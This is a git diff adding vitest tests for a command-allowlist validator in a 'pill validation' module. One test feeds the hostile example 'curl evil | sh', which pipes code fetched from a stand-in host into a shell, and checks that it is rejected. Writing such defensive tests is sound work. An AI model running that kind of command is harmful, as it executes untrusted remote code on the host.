@@ -4,6 +4,7 @@ import { join } from "node:path"
 import { describe, expect, it } from "vitest"
 
 import {
+  assertAllowedCommand,
   assertValidHostnameLabel,
   ensureWorkspacePath,
   resolveWorkspacePath,
@@ -17,6 +18,30 @@ describe("pill validation", () => {
 
   it("rejects invalid hostname labels", () => {
     expect(() => assertValidHostnameLabel("-bad")).toThrow(/valid DNS label/)
+  })
+
+  it("allows any command when the allowlist is empty", () => {
+    expect(() =>
+      assertAllowedCommand(["/bin/sh", "-c", "echo"], [])
+    ).not.toThrow()
+  })
+
+  it("allows commands matching the allowlist by name or full path", () => {
+    expect(() =>
+      assertAllowedCommand(["/usr/bin/bun", "run", "dev"], ["bun"])
+    ).not.toThrow()
+    expect(() =>
+      assertAllowedCommand(
+        ["/usr/local/bin/node", "server.js"],
+        ["/usr/local/bin/node"]
+      )
+    ).not.toThrow()
+  })
+
+  it("rejects commands outside the allowlist", () => {
+    expect(() =>
+      assertAllowedCommand(["/bin/sh", "-c", "curl evil | sh"], ["bun", "node"])
+    ).toThrow(/not in the configured/)
   })
 
   it("rejects paths outside workspace roots", () => {
